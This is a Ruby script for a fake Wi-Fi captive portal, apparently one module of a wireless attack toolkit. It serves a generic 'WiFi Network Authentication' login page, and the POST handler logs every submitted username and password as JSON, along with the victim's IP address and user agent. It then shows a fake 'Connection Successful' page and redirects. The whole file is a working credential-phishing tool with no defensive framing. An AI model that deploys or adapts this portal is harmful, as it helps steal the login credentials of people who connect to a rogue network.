#!/usr/bin/env ruby
# frozen_string_literal: true

require 'json'
require 'time'
require 'socket'
require 'webrick'

def emit(event, iface, bssid, ssid, channel, data)
  puts JSON.generate(event: event, iface: iface, bssid: bssid, ssid: ssid, channel: channel, data: data, timestamp: Time.now.iso8601)
  $stdout.flush
end

LOGIN_PAGE = <<~HTML
<!DOCTYPE html>
<html>
<head>
<title>WiFi Login</title>
<style>
body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
form { display: inline-block; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
input { display: block; margin: 10px auto; padding: 10px; width: 250px; border: 1px solid #ddd; border-radius: 4px; }
button { background: #4CAF50; color: white; padding: 12px 30px; border: none; border-radius: 4px; cursor: pointer; }
h2 { color: #333; }
p { color: #666; }
</style>
</head>
<body>
<form method="POST" action="/login">
<h2>WiFi Network Authentication</h2>
<p>Please login to access the network</p>
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form>
</body>
</html>
HTML

SUCCESS_PAGE = <<~HTML
<!DOCTYPE html>
<html>
<head><title>Connected</title></head>
<body style="text-align:center;padding:50px;font-family:Arial;">
<h2>Connection Successful</h2>
<p>You are now connected to the network.</p>
<p style="color:#888;">You will be redirected shortly...</p>
<script>setTimeout(function(){window.location.href=document.referrer||'/';},3000);</script>
</body>
</html>
HTML

class CaptivePortalServlet < WEBrick::HTTPServlet::AbstractServlet
  def initialize(server, redirect_url)
    super(server)
    @redirect_url = redirect_url
  end

  def do_GET(request, response)
    case request.path
    when '/'
      emit('portal_page_served', '', '', '', 0, { remote: request.remote_ip, user_agent: request['User-Agent'] })
      response.status = 200
      response['Content-Type'] = 'text/html'
      response.body = LOGIN_PAGE
    else
      response.status = 302
      response['Location'] = '/'
    end
  end

  def do_POST(request, response)
    username = request.query['username'] || ''
    password = request.query['password'] || ''

    emit('portal_credentials', '', '', '', 0, {
      username: username, password: password,
      remote_ip: request.remote_ip, user_agent: request['User-Agent'],
      timestamp: Time.now.iso8601
    })

    $stdout.flush

    response.status = 200
    response['Content-Type'] = 'text/html'
    if @redirect_url && !@redirect_url.empty?
      response.body = SUCCESS_PAGE.sub("window.location.href=document.referrer||'/'", "window.location.href='#{@redirect_url}'")
    else
      response.body = SUCCESS_PAGE
    end
  end
end

class RedirectServlet < WEBrick::HTTPServlet::AbstractServlet
  def do_GET(request, response)
    emit('portal_redirect', '', '', '', 0, { path: request.path, remote: request.remote_ip })
    response.status = 200
    response['Content-Type'] = 'text/html'
    response.body = '<html><body><h2>Redirected</h2></body></html>'
  end
end

begin
  port = (ARGV[0] || '8080').to_i
  redirect_url = ARGV[1] || ''

  emit('captive_portal_start', '', '', '', 0, { port: port, redirect_url: redirect_url })

  server = WEBrick::HTTPServer.new(
    Port: port,
    Logger: WEBrick::Log.new('/dev/null'),
    AccessLog: [],
    BindAddress: '0.0.0.0'
  )

  server.mount '/', CaptivePortalServlet, redirect_url

  emit('captive_portal_running', '', '', '', 0, { port: port, url: "http://0.0.0.0:#{port}" })

  %w[INT TERM].each do |sig|
    trap(sig) do
      emit('captive_portal_shutdown', '', '', '', 0, { signal: sig })
      server.shutdown
    end
  end

  server.start

  emit('captive_portal_stopped', '', '', '', 0, { port: port })

rescue Interrupt
  emit('captive_portal_interrupted', '', '', '', 0, {})
rescue => e
  $stderr.puts JSON.generate(event: 'error', data: { message: e.message, backtrace: e.backtrace&.first }, timestamp: Time.now.iso8601)
  exit 1
end
